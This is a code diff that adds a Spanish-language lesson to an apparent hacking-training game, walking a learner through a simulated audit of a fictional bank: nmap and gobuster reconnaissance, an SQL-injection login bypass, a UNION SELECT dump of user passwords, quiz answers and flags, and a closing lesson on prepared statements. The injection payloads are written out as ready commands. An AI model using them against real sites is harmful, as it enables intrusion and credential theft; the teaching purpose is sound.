@@ -1219,6 +1219,134 @@ export const LESSONS: Lesson[] = [
       },
     ],
   },
+  {
+    id: "l-eng-web",
+    title: "ENGAGEMENT: auditá el banco de punta a punta",
+    level: "avanzado",
+    summary:
+      "Una auditoría web completa como en la vida real: reconocer, enumerar, explotar, saquear y leer lo que sacaste.",
+    concept:
+      "Esto no es un truco suelto: es una AUDITORÍA completa, la metodología que usa un pentester de verdad. El orden es sagrado: (1) reconocer qué hay, (2) enumerar las rutas, (3) explotar la falla, (4) saquear los datos, (5) LEER e interpretar lo que sacaste. Cada paso te da la pista para el siguiente. No corras: mirá cada salida y entendela, porque después te voy a preguntar.",
+    reward: { xp: 320, coins: 260 },
+    steps: [
+      {
+        explain:
+          "Paso 1 — RECONOCIMIENTO. Antes de tocar nada, mirás. ¿Qué máquina es banco.nande y qué puertas tiene abiertas? Escaneá sus servicios con detección de versión.",
+        task: "Escaneá: nmap -sV banco.nande",
+        hints: [
+          "La herramienta de escaneo es nmap; -sV detecta la versión del servicio.",
+          "Escribí: nmap -sV banco.nande",
+        ],
+        hint: "Escribí: nmap -sV banco.nande",
+        check: (cmd, out) =>
+          usedTool(cmd, "nmap") &&
+          /banco\.nande/i.test(cmd) &&
+          /80\/tcp/.test(out) &&
+          /open/i.test(out),
+        debrief:
+          "Un solo puerto abierto: el 80 (web, nginx). No hay SSH ni nada más: TODA la superficie de ataque es la web. Ya sabés por dónde entrar.",
+      },
+      {
+        explain:
+          "Leé la salida del escaneo que acabás de ver y respondé, para asegurarnos de que la entendiste.",
+        task: "Respondé con 'responder ...'",
+        hint: "Fijate la línea que dice '80/tcp open nginx'. El número del puerto alcanza.",
+        question: "¿Qué número de puerto quedó ABIERTO en banco.nande?",
+        answers: ["80", "80/tcp", "puerto 80", "el 80"],
+        answerContains: true,
+        debrief:
+          "Exacto: el 80, el puerto web (HTTP). Cada puerto abierto es una puerta; esta es la única, así que por acá vamos.",
+      },
+      {
+        explain:
+          "Paso 2 — ENUMERACIÓN. Sabés que hay una web, pero no qué páginas tiene. gobuster prueba una lista de rutas comunes y te dice cuáles existen y con qué estado responden.",
+        task: "Enumerá rutas: gobuster dir -u http://banco.nande -w comun",
+        hints: [
+          "gobuster en modo 'dir' prueba rutas; -u es la URL y -w la lista de palabras.",
+          "Escribí: gobuster dir -u http://banco.nande -w comun",
+        ],
+        hint: "Escribí: gobuster dir -u http://banco.nande -w comun",
+        check: (cmd, out) =>
+          usedTool(cmd, "gobuster") &&
+          /\/login/.test(out) &&
+          /(\/movimientos|\/panel)/.test(out),
+        debrief:
+          "Tres rutas: /login responde 200 (abierta), y /panel y /movimientos responden 401 (protegidas, piden sesión). Lo PROTEGIDO es lo jugoso: ahí están los datos. Y /login es la puerta para conseguir esa sesión.",
+      },
+      {
+        explain: "Mirá las rutas que encontró gobuster y respondé.",
+        task: "Respondé con 'responder ...'",
+        hint: "La que responde 200 (no 401) es por donde te autenticás.",
+        question: "¿Qué ruta (200) sirve para autenticarte?",
+        answers: ["/login", "login"],
+        answerContains: true,
+        debrief:
+          "Sí: /login. Las 401 (/panel, /movimientos) recién se abren con sesión. Vamos a conseguirla rompiendo el login.",
+      },
+      {
+        explain:
+          "Paso 3 — EXPLOTACIÓN. El login arma su consulta SQL pegando lo que escribís. Inyectá un usuario que haga la condición SIEMPRE verdadera y comente el chequeo de la contraseña.",
+        task:
+          "Burlá el login (copiá tal cual):  curl -X POST http://banco.nande/login -d \"usuario=admin' OR '1'='1 --&password=x\"",
+        hints: [
+          "Cerrás la comilla del usuario, agregás  OR '1'='1  (siempre verdadero) y comentás el resto con --.",
+          "curl -X POST http://banco.nande/login -d \"usuario=admin' OR '1'='1 --&password=x\"",
+        ],
+        hint: "curl -X POST http://banco.nande/login -d \"usuario=admin' OR '1'='1 --&password=x\"",
+        check: (_cmd, out) =>
+          /sesi[oó]n iniciada/i.test(out) || out.includes("ND{sqli_login_bypass}"),
+        debrief:
+          "¡Adentro! ' OR '1'='1 hace que la condición nunca falle, y -- comenta el chequeo de la contraseña. Entraste al panel sin saber ninguna clave: bandera ND{sqli_login_bypass}.",
+      },
+      {
+        explain: "Leé la respuesta del panel al que entraste y respondé.",
+        task: "Respondé con 'responder ...'",
+        hint: "Fijate la línea 'Sesión iniciada como ...'.",
+        question: "¿Como qué usuario entraste al panel?",
+        answers: ["admin"],
+        answerContains: true,
+        debrief:
+          "Entraste como admin, el usuario más poderoso. Con esa sesión ya podés tocar las rutas protegidas.",
+      },
+      {
+        explain:
+          "Paso 4 — SAQUEO. El buscador de /movimientos también es inyectable. Contá que son 4 columnas y usá UNION SELECT para traer la tabla usuarios (con sus contraseñas) dentro del mismo resultado.",
+        task:
+          "Volcá los usuarios:  curl \"http://banco.nande/movimientos?q=a%' UNION SELECT id,usuario,password,rol FROM usuarios--\"",
+        hints: [
+          "UNION SELECT pega una segunda consulta de 4 columnas que lee otra tabla.",
+          "curl \"http://banco.nande/movimientos?q=a%' UNION SELECT id,usuario,password,rol FROM usuarios--\"",
+        ],
+        hint: "curl \"http://banco.nande/movimientos?q=a%' UNION SELECT id,usuario,password,rol FROM usuarios--\"",
+        check: (_cmd, out) =>
+          out.includes("ND{sqli_union_dump}") || /M8arete-2024!/.test(out),
+        debrief:
+          "Volcaste la tabla usuarios entera, con las contraseñas EN CLARO (agravante gravísimo): bandera ND{sqli_union_dump}. Ese es el daño real de una SQLi: no es entrar, es llevarse todo.",
+      },
+      {
+        explain:
+          "Paso 5 — INTERPRETAR. Un pentester no solo saca datos: los lee. Mirá la tabla que volcaste y respondé.",
+        task: "Respondé con 'responder ...'",
+        hint: "En la fila del usuario 'admin', la contraseña aparece en la columna del monto.",
+        question: "¿Cuál es la contraseña real del usuario admin que sacaste?",
+        answers: ["M8arete-2024!"],
+        answerContains: true,
+        debrief:
+          "Esa contraseña la sacaste vos de la base, no estaba escrita en ningún lado. Con ella entrarías directo, sin la inyección.",
+      },
+      {
+        explain:
+          "Cierre — INFORME Y DEFENSA. Toda auditoría termina explicando cómo se arregla. Una sola palabra cierra el caso.",
+        task: "Respondé con 'responder ...'",
+        hint: "Separan la orden SQL del dato para que tu texto nunca sea código. Son consultas ___.",
+        question: "¿Qué tipo de consultas SQL hace que ' OR '1'='1 ya NO funcione?",
+        answers: ["preparadas", "parametrizadas", "prepared", "preparada", "parametrizada"],
+        answerContains: true,
+        debrief:
+          "Consultas preparadas (parametrizadas): mandan la orden y los datos por caminos separados, así tu texto nunca se vuelve SQL. Cerraste una auditoría completa: recon → enumeración → explotación → saqueo → interpretación → informe. Eso es hacking de verdad, y el hacker ético REPORTA el hallazgo, no roba.",
+      },
+    ],
+  },
 ];
 
 /** Motor de lecciones: mantiene el paso actual de la lección activa. */
